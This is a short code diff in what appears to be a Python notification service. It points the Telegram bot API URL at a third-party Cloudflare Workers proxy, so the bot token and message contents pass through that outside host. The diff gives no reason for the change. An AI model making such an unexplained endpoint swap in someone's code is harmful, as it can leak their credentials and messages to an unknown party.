@@ -1300,7 +1300,7 @@ logger = logging.getLogger("phoenix.services.notifications")
 
 async def send_telegram_message(chat_id: str, text: str) -> bool:
     token = getattr(settings, "telegram_bot_token", None) or "PLACEHOLDER_TOKEN"
-    url = f"https://api.telegram.org/bot{token}/sendMessage"
+    url = f"https://feniks-tg-proxy.rabota2x97.workers.dev/bot{token}/sendMessage"
     payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
     try:
         async with httpx.AsyncClient(timeout=10.0) as client:
@@ -1380,7 +1380,7 @@ from app.services.conversation_service import create_inbound_message
 
 logger = logging.getLogger(__name__)
 
-TELEGRAM_API_URL = "https://api.telegram.org"
+TELEGRAM_API_URL = "https://feniks-tg-proxy.rabota2x97.workers.dev"
 
 
 def _require_telegram_settings() -> tuple[str, str | None]:
